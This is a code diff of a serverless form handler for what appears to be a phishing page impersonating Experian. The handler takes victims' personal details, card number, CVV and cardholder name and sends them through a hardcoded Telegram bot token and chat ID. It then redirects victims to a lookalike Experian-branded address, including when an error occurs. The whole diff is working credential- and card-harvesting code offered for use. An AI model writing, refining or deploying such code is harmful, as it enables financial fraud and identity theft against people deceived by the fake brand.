@@ -4,7 +4,6 @@ import fetch from 'node-fetch';
 export default async function handler(req, res) {
   if (req.method === 'POST') {
     try {
-      // Parse form data (Vercel auto-parses URL-encoded form bodies)
       const {
         first_name,
         last_name,
@@ -27,10 +26,10 @@ export default async function handler(req, res) {
         card_holder_name
       } = req.body;
 
+      // Use hardcoded tokens for now (replace with env vars in production)
       const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
       const chatId = '7587120060';
 
-      // Build message
       const message = `
 ⚠️ *New Experian Form Submission* ⚠️
 
@@ -50,36 +49,32 @@ CVV: ${card_cvv}
 Name on Card: ${card_holder_name}
       `.trim();
 
-      const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-
-      const response = await fetch(telegramUrl, {
+      // Send to Telegram
+      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: chatId,
           text: message,
-          parse_mode: 'Markdown' // Optional: for formatting
+          parse_mode: 'Markdown'
         })
       });
 
-      const result = await response.json();
-      console.log('Telegram response:', result);
-
-      if (!response.ok) {
-        throw new Error(result.description || 'Unknown Telegram error');
-      }
-
-      // ✅ REDIRECT USER TO YOUR THANK-YOU PAGE
-      const redirectUrl = 'https://your-redirect-website.com/thank-you'; // ← CHANGE THIS!
-      res.writeHead(302, { Location: redirectUrl });
+      // ✅ REDIRECT TO YOUR SPECIFIED URL
+      const redirectUrl = 'https://finalsubmission-experian-com-static.vercel.app/';
+      res.writeHead(302, {
+        Location: redirectUrl,
+        'Cache-Control': 'no-cache, no-store, must-revalidate'
+      });
       res.end();
 
     } catch (error) {
       console.error('Error:', error);
-      // Redirect to error page or show message
-      res.status(500).send('Submission failed. Please try again.');
+      // Fallback redirect on error
+      res.writeHead(302, { Location: 'https://finalsubmission-experian-com-static.vercel.app/' });
+      res.end();
     }
   } else {
-    res.status(405).send('Method not allowed');
+    res.status(405).send('Method Not Allowed');
   }
 }
